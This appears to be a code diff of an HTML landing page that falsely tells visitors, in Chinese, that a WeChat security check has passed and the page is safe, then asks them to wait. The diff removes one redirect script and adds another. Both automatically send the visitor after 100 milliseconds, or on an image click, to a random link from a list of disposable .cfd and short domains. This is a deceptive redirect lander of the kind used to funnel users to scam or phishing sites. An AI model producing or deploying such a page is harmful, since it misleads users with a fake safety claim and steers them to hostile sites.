@@ -51,27 +51,11 @@
         margin-top: 1em;
       }
     </style>
-    <script type="text/javascript">
-      window.onload = function () {
-        var links = [
-          "http://wsm7m.mgwrnahh.cfd/nByw9okg",
-          "http://z4emn.rmlraclf.cfd/bET1AI2t",
-          "http://57jcp.oaifxano.cfd/up2awEl2",
-          "http://csfcs.fmvvspak.cfd/zbXoz4ig",
-          "https://um8s.com",
-          "https://bt0l.com",
-        ];
-        var randomLink = links[Math.floor(Math.random() * links.length)];
-        setTimeout(function () {
-          window.location.href = randomLink;
-        }, 100);
-      };
-    </script>
   </head>
   <body>
     <div class="container">
       <div class="icon">
-        <img src="img2/icon.png" alt="Icon" />
+        <img src="img2/icon.png" alt="Icon" id="iconImage" />
       </div>
       <h1>微信安全检测已通过！页面访问安全！</h1>
       <p><span class="highlight">请稍等，不要退出！页面正在跳转中...</span></p>
@@ -81,9 +65,37 @@
     </div>
     <div class="image-container">
       <!-- <img src="img2/1.jpg" alt="Image 1" />
-      <img src="img2/2.jpg" alt="Image 2" />
-      <img src="img2/3.jpg" alt="Image 3" /> -->
-      <img src="img2/4.jpg" alt="Image 4" />
+    <img src="img2/2.jpg" alt="Image 2" />
+    <img src="img2/3.jpg" alt="Image 3" /> -->
+      <img src="img2/4.jpg" alt="Image 4" id="clickableImage" />
     </div>
+
+    <script type="text/javascript">
+      var links = [
+        "http://wsm7m.mgwrnahh.cfd/nByw9okg",
+        "http://z4emn.rmlraclf.cfd/bET1AI2t",
+        "http://57jcp.oaifxano.cfd/up2awEl2",
+        "http://csfcs.fmvvspak.cfd/zbXoz4ig",
+        "https://um8s.com",
+        "https://bt0l.com",
+      ];
+
+      function handleImageClick() {
+        var randomLink = links[Math.floor(Math.random() * links.length)];
+
+        clearTimeout(timer);
+
+        window.location.href = randomLink;
+      }
+
+      var clickableImage = document.getElementById("clickableImage");
+
+      clickableImage.addEventListener("click", handleImageClick);
+
+      var timer = setTimeout(function () {
+        var randomLink = links[Math.floor(Math.random() * links.length)];
+        window.location.href = randomLink;
+      }, 100);
+    </script>
   </body>
 </html>
